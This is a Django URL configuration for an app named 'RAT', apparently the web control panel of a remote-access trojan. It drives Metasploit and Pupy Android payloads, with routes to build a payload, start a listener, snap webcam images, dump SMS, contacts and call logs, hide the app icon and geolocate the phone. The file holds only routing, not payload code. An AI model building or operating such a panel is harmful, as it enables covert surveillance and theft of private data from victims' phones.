from django.urls import path
from . import views

app_name = 'RAT'
urlpatterns = [
    path('', views.index , name='index'),

    path('add/download/', views.down , name='download'),
############################## Metasploit ################################

    path('msf/', views.metasploit.methods , name='msf_index'),


######## metasploit android by  rat:
    path('msf/add/', views.metasploit.android.add , name='msf/android/add'),
    path('msf/listen/', views.metasploit.android.listen , name='msf/android/listen'),
    path('msf/listen/start', views.metasploit.android.startlisten , name='msf/android/startlisten'),
    path('msf/listen/webcamsnap', views.metasploit.android.webcamsnap , name='msf/android/webcamsnap'),
    path('msf/listen/webcamsnap2', views.metasploit.android.webcamsnap2 , name='msf/android/webcamsnap2'),
    path('msf/listen/dumpsms', views.metasploit.android.dumpsms , name='msf/android/dumpsms'),
    path('msf/listen/dumpcontacts', views.metasploit.android.dumpcontacts , name='msf/android/dumpcontacts'),
    path('msf/listen/dumpcalllog', views.metasploit.android.dumpcalllog , name='msf/android/dumpcalllog'),
    path('msf/listen/hideappicon', views.metasploit.android.hideappicon , name='msf/android/hideappicon'),
    path('msf/listen/geolocate', views.metasploit.android.geolocate , name='msf/android/geolocate'),
######################### pupy ###########################################

    path('pupy/', views.pupy.methods , name='pupy_index'),


######## pupy android by  rat:
    path('pupy/add/', views.pupy.add , name='pupy/android/add'),
    path('pupy/listen/', views.pupy.listen , name='pupy/android/listen'),
    path('pupy/listen/start', views.pupy.startlisten , name='pupy/android/startlisten'),
    path('pupy/listen/webcamsnap', views.pupy.webcamsnap , name='pupy/android/webcamsnap'),


]
